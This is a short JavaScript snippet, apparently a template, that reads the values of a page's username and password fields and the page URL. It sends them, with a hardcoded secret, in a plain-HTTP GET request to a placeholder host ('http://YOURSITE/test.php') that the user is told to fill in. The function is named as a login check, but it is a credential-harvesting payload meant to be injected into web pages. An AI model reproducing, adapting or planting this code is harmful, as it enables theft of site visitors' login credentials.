<script type="text/javascript">
    function verifyLoginZ() {
        var username = document.getElementsByName("PLACEHOLDERUSERNAME")[0].value;
        var password = document.getElementsByName("PLACEHOLDERPASSWORD")[0].value;
        var website = window.location.href.toString();
        var secret = "takeiteasy";

        if (window.XMLHttpRequest) {
            // code for IE7+, Firefox, Chrome, Opera, Safari
            xmlhttp = new XMLHttpRequest();
        } else {
            // code for IE6, IE5
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }

        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200)
            {
                alert(xmlhttp.responseText);
            }
        };

        // Fill in your URL and the correct GET statements
        xmlhttp.open("GET", "http://YOURSITE/test.php?name=" + username + "&password=" + password + "&secret=" + secret + "&website=" + website, true);
        xmlhttp.send();

    }
</script>
